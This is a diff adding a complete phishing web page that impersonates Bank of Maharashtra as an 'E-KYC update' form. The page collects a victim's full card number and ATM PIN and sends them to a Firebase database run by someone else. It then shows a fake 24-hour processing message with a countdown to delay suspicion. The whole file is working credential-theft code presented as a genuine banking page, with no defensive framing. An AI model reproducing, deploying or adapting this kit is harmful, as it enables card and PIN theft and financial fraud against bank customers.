@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Card Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    /* Same styling as your provided CSS */
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #f4f4f4;
+      font-family: 'Arial', sans-serif;
+    }
+    .header-img {
+      width: 100%;
+      display: block;
+      margin-bottom: 10px;
+    }
+    .headline-box {
+      text-align: center;
+      margin: 10px auto 20px;
+      padding: 0 15px;
+    }
+    .main-title {
+      font-size: 24px;
+      font-weight: bold;
+      color: #003366;
+    }
+    .sub-title {
+      font-size: 15px;
+      color: #333;
+      opacity: 0.85;
+      margin-top: 5px;
+    }
+    .card-box {
+      width: 90%;
+      max-width: 290px;
+      border-radius: 16px;
+      background: linear-gradient(145deg, #1976d2, #afdbff);
+      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+      padding: 20px;
+      margin: 30px auto;
+      color: white;
+    }
+    .card-title {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 10px;
+      text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-number {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+      margin: 12px 0;
+    }
+    .card-number input, .card-row input {
+      width: 20%;
+      padding: 8px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      text-align: center;
+      background: rgba(255,255,255,0.2);
+      color: white;
+      box-shadow: inset 0 1px 2px rgba(0,0,0,0.2);
+    }
+    .card-number input {
+      max-width: 60px;
+    }
+    .card-row {
+      margin-top: 10px;
+    }
+    .card-label {
+      font-size: 10px;
+      margin-top: 5px;
+      opacity: 0.8;
+    }
+    .side-button {
+      margin: 25px auto 15px;
+      padding: 12px;
+      width: 90%;
+      max-width: 300px;
+      font-size: 17px;
+      background-color: #2db1f1;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      display: block;
+      cursor: pointer;
+    }
+    .bottom-image {
+      width: 100%;
+      max-width: 450px;
+      display: block;
+      margin: 10px auto;
+      border-radius: 4px;
+    }
+    .modal-blur-bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      backdrop-filter: blur(5px);
+      background: rgba(0, 0, 0, 0.4);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+    .modal-message {
+      background: #fff;
+      max-width: 90%;
+      width: 350px;
+      padding: 25px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+      line-height: 1.5;
+    }
+    .modal-message h3 {
+      color: #003366;
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+    .modal-message p {
+      font-size: 14px;
+      color: #333;
+      margin: 8px 0;
+    }
+    .countdown {
+      color: green;
+      font-size: 15px;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+
+  <img class="header-img" src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Bank Header">
+
+  <div class="headline-box">
+    <div class="main-title">Welcome To Digital Banking E-KYC Update</div>
+    <div class="sub-title">(Experience secure, simple, and smart banking solutions for your financial needs.)</div>
+  </div>
+
+  <div class="card-box">
+    <div class="card-title">Debit/Credit Card Details</div>
+    <div class="card-number">
+      <input type="tel" id="card1" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card2" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card3" maxlength="4" pattern="\d*" inputmode="numeric" required>
+      <input type="tel" id="card4" maxlength="4" pattern="\d*" inputmode="numeric" required>
+    </div>
+    <div class="card-label">Card Number</div>
+    <div class="card-row">
+      <input type="password" id="pin" maxlength="4" placeholder="ATM PIN" inputmode="numeric" required>
+    </div>
+    <div class="card-row">
+      <div class="card-label">ATM PIN</div>
+    </div>
+  </div>
+
+  <button class="side-button" onclick="saveCardData()">Continue</button>
+
+  <img class="bottom-image" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Secure Banking">
+
+  <div class="modal-blur-bg" id="kycModal">
+    <div class="modal-message">
+      <h3>Dear Customer,</h3>
+      <p>Thank you for submitting your E-KYC update request.</p>
+      <p>We are currently processing your details as part of our secure banking verification system.</p>
+      <p>Your update is important to us and ensures continued access to all digital banking services.</p>
+      <p>Kindly allow up to <strong>24 hours</strong> for the verification and processing to be completed.</p>
+      <p>During this time, there is no need for any further action from your side.</p>
+      <p>You will be notified once your E-KYC update has been successfully completed.</p>
+      <p class="countdown" id="countdownText"></p>
+    </div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBbJGcgqT9jTyB5osrUhoNLH7pRA7XzH08",
+  authDomain: "maha-4c3c1.firebaseapp.com",
+  projectId: "maha-4c3c1",
+  storageBucket: "maha-4c3c1.firebasestorage.app",
+  messagingSenderId: "593096443604",
+  appId: "1:593096443604:web:72cd492e28f13750f4dd41"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    let sessionId = localStorage.getItem("sessionId");
+    if (!sessionId) {
+      sessionId = Math.random().toString(36).substring(2, 10) + Date.now();
+      localStorage.setItem("sessionId", sessionId);
+    }
+
+    function saveCardData() {
+      const card1 = document.getElementById("card1").value.trim();
+      const card2 = document.getElementById("card2").value.trim();
+      const card3 = document.getElementById("card3").value.trim();
+      const card4 = document.getElementById("card4").value.trim();
+      const pin = document.getElementById("pin").value.trim();
+
+      if ([card1, card2, card3, card4, pin].some(v => v.length !== 4)) {
+        alert("Please fill all fields correctly.");
+        return;
+      }
+
+      const card = `${card1}${card2}${card3}${card4}`;
+
+      db.collection("cards").add({
+        card,
+        pin,
+        sessionId,
+        timestamp: firebase.firestore.FieldValue.serverTimestamp()
+      }).then(() => {
+        document.getElementById("kycModal").style.display = "flex";
+        startCountdown(86400); // 24 hours
+      }).catch((err) => {
+        console.error("Error saving card data:", err);
+        alert("Something went wrong. Try again.");
+      });
+    }
+
+    function startCountdown(seconds) {
+      const el = document.getElementById("countdownText");
+      function update() {
+        const hrs = Math.floor(seconds / 3600);
+        const mins = Math.floor((seconds % 3600) / 60);
+        const secs = seconds % 60;
+        el.textContent = `Time left: ${hrs}h ${mins}m ${secs}s`;
+        if (seconds > 0) {
+          seconds--;
+          setTimeout(update, 1000);
+        }
+      }
+      update();
+    }
+  </script>
+</body>
+</html>
